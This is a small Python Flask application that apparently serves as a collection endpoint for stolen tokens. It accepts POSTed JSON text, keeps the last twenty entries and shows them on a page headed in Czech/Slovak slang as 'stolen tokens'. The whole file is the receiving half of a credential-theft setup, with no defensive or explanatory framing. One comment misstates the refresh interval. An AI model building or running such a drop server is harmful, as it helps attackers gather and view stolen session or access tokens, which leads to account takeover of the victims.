import os
from flask import Flask, request, render_template_string

app = Flask(__name__)

# Changed from a single string to a list to store multiple messages
messages_history = []

HTML_TEMPLATE = """
<!DOCTYPE html>
<html>
<head>
    <title>tokeny mnam mnam</title>
    <!-- Refreshes the page every 5 seconds to grab new data -->
    <meta http-equiv="refresh" content="10"> 
    <style>
        body { font-family: Arial, sans-serif; text-align: center; margin-top: 50px; background-color: #f9f9f9; }
        .history-container { max-width: 600px; margin: 0 auto; text-align: left; }
        .message-box { 
            color: #2bc48a; 
            background: #ffffff; 
            padding: 15px; 
            margin-bottom: 10px; 
            border-radius: 8px; 
            border-left: 5px solid #2bc48a;
            box-shadow: 0 2px 4px rgba(0,0,0,0.05);
        }
        .empty { color: #888; font-style: italic; }
    </style>
</head>
<body>
    <h2>tekeny ukradeny:</h2>
    
    <div class="history-container">
        {% if not history %}
            <p class="empty">No data received yet.</p>
        {% else %}
            <!-- Loops through the list backward so the newest message is always at the top -->
            {% for msg in history[::-1] %}
                <div class="message-box">
                    <strong>&gt;</strong> {{ msg }}
                </div>
            {% endfor %}
        {% endif %}
    </div>
</body>
</html>
"""

@app.route("/", methods=["GET", "POST"])
def home():
    global messages_history
    
    if request.method == "POST":
        data = request.get_json()
        if data and "text" in data:
            # Append the new message to our list history
            messages_history.append(data["text"])
            
            # Optional: Keep only the last 20 messages so memory doesn't grow forever
            if len(messages_history) > 20:
                messages_history.pop(0)
                
        return {"status": "success"}, 200
        
    return render_template_string(HTML_TEMPLATE, history=messages_history)

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)
